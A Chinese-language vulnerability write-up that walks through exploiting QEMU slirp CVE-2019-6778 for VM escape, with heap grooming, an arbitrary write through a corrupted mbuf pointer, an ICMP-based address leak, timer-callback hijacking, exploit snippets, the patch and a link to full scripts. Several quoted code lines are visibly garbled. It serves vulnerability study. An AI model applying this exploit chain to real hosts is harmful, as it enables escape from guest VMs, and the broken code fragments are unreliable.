              ip->ip_tos &= ~1;
            ip->ip_off ip_tos & 1 || ip->ip_off) {
                ip = ip_reass(slirp, ip, fp);
                            if (ip == NULL)
        ...
    }
    static struct ip *
    ip_reass(Slirp *slirp, struct ip *ip, struct ipq *fp)
    {
        register struct mbuf *m = dtom(slirp, ip);
        register struct ipasfrag *q;
        int hlen = ip->ip_hl frag_link.next;
        m = dtom(slirp, q);
        q = (struct ipasfrag *) q->ipf_next;
        while (q != (struct ipasfrag*)&fp->frag_link) {
          struct mbuf *t = dtom(slirp, q);
          q = (struct ipasfrag *) q->ipf_next;
          m_cat(m, t);
        }
    }
    /*
     * Copy data from one mbuf to the end of
     * the other.. if result is too big for one mbuf, allocate
     * an M_EXT data segment
     */
    void
    m_cat(struct mbuf *m, struct mbuf *n)
    {
        /*
         * If there's no room, realloc
         */
        if (M_FREEROOM(m) m_len)
            m_inc(m, m->m_len + n->m_len);
        memcpy(m->m_data+m->m_len, n->m_data, n->m_len);
        m->m_len += n->m_len;
        m_free(n);
    }
可以看到在`ip_input`中，当数据包是最后一个切片数据包时（IP_MF不为1），会在`ip_reass`函数中调用`m_cat`将数据包组合起来。关键代码是`memcpy(m->m_data+m->m_len,
n->m_data,
n->m_len)`，如果我们可以利用堆溢出覆盖`m`结构体的`m_data`，则就可以实现将可控的数据`n->m_data`写到任意的地址`m->m_data+m->m_len`处。
exp中任意地址写函数关键代码如下，首先利用malloc原语将清空堆，使得堆排布可控。接着利用与host主机113端口建立socket连接，申请出来可溢出的`struct
sbuf
*so_rcv`结构体。紧接着在后面分配一个ip切片数据包`mbuf`，其id为0xdead。由于堆的排布，该数据包是紧贴着`so_rcv`的，可以利用堆溢出覆盖`mbuf`中的`m_data`指针。最后再次发送相同id（0xdead）并且MF标志为0的数据包，`memcpy`拷贝至`m_data`指针处时，实现任意地址写。
            ....
        //使堆排布可控
            for (i = 0; i > (i * 8)) & 0xff; // 覆盖m_data指针
        }
        write(s, payload_start, (uint8_t *)payload - payload_start);
        // write(s, payload, 0x1000);
        ...
        //再次发送相同id且MF标志位为0的数据包，实现任意地址写
        pkt_info.ip_id = 0xdead;
        pkt_info.ip_off = 0x300 + 24;
        pkt_info.MF = 0;
        pkt_info.ip_p = 0xff;
        send_ip_pkt(&pkt_info, write_data, write_data_len);
### 信息泄露
因为程序开启了PIE，所以还需要信息泄露才能进一步利用。
信息泄露主要是利用伪造ICMP响应请求包，得到响应应答包实现。主要的步骤如下：
  1. 溢出修改m_data的低位，在堆的前面写入一个伪造的ICMP包头。
  2. 发送一个ICMP请求，将MF bit置位（1）。
  3. 第二次溢出修改第二步的m_data的低位至伪造的包头地址。
  4. 发送MF bit为0的包结束ICMP请求。
  5. 得到ICMP应答包，实现信息泄露。
首先是利用堆溢出将m_data的低位覆盖（exp中是覆盖低3位为0x000b00），然后利用任意地址写将伪造的icmp包写入到该地址处；接着是发送一个ICMP响应请求包，并将其MF位置1，这样它会在队列中等待剩余的数据包；然后再利用溢出将第二步中的ICMP响应请求包的m_data的低位覆盖成伪造的ICMP请求包的位置，这样响应请求ICMP包的数据就变成了伪造的ICMP请求包；最后再发送一个MF为0的数据包结束该ICMP请求，将该伪造的请求发送出去；然后等待ICMP应答包，在应答包中可以得到程序地址以及堆地址，实现信息泄露。
### 程序执行流控制
有了程序地址和堆地址，再结合任意地址写，可以往任意地址写任何的数据，因此只要找到可以控制程序执行流的目标即可。结合作者给出的writeup与前面一系列文章，仍然可以利用`QEMUTimer`搞事情。
在bss段有个全局数组`main_loop_tlg`，它是QEMUTimerList的数组。我们可以在堆中伪造一个QEMUTimerList，将`cb`指针覆盖成想要执行的函数，`opaque`为参数地址。再将其地址覆盖到`main_loop_tlg`中，等expire_time时间到，将会执行`cb(opaque)`，成功控制程序执行流。
    // util/qemu-timer.c
    struct QEMUTimerList {
        QEMUClock *clock;
        QemuMutex active_timers_lock;
        QEMUTimer *active_timers;
        QLIST_ENTRY(QEMUTimerList) list;
        QEMUTimerListNotifyCB *notify_cb;
        void *notify_opaque;
        /* lightweight method to mark the end of timerlist's running */
        QemuEvent timers_done_ev;
    };
    // include/qemu/timer.h
    struct QEMUTimer {
        int64_t expire_time;        /* in nanoseconds */
        QEMUTimerList *timer_list;
        QEMUTimerCB *cb;  // 函数指针
        void *opaque;     // 参数
        QEMUTimer *next;
        int attributes;
        int scale;
    };
需要指出的是，程序一般MTU都为1500，即大于1500的数据包会被分片。而exp中使用的数据包大小是0x2000（8192）,所以需要使用命令`ifconfig
enp0s3 mtu 9000 up`，来将MTU设置的大一些，否则会报`sendto() failed : Message too long`的错误。
## 补丁比对
在目录中执行`git checkout tags/v3.1.1`，既可以拿到patch以后的代码：
    case EMU_IDENT:
            /*
             * Identification protocol as per rfc-1413
             */
            {
                struct socket *tmpso;
                struct sockaddr_in addr;
                socklen_t addrlen = sizeof(struct sockaddr_in);
                struct sbuf *so_rcv = &so->so_rcv;
                if (m->m_len > so_rcv->sb_datalen   //增加了检查
                        - (so_rcv->sb_wptr - so_rcv->sb_data)) {
                    return 1;
                }
                memcpy(so_rcv->sb_wptr, m->m_data, m->m_len);
                so_rcv->sb_wptr += m->m_len;
                so_rcv->sb_rptr += m->m_len;
可以看到是在`memcpy`之前简单粗暴增加了检查。
## 小结
感谢Kira师傅在复现过程中的指导，大佬还是强。
在我的环境中，由于信息泄露里面基址拿到的成功率不高，所以最终exp成功率也一般，但还是学到了很多。
到这里qemu
pwn的学习就结束了，本来还打算复现`CVE-2019-14378`，但是两个好像差不多，所以就没有分析了，后面还是学习linux内核漏洞吧。
相关文件与脚本[链接](https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/cve-2019-6778)
## 链接
  1. [qemu-vm-escape](https://github.com/Kira-cxy/qemu-vm-escape)
* * *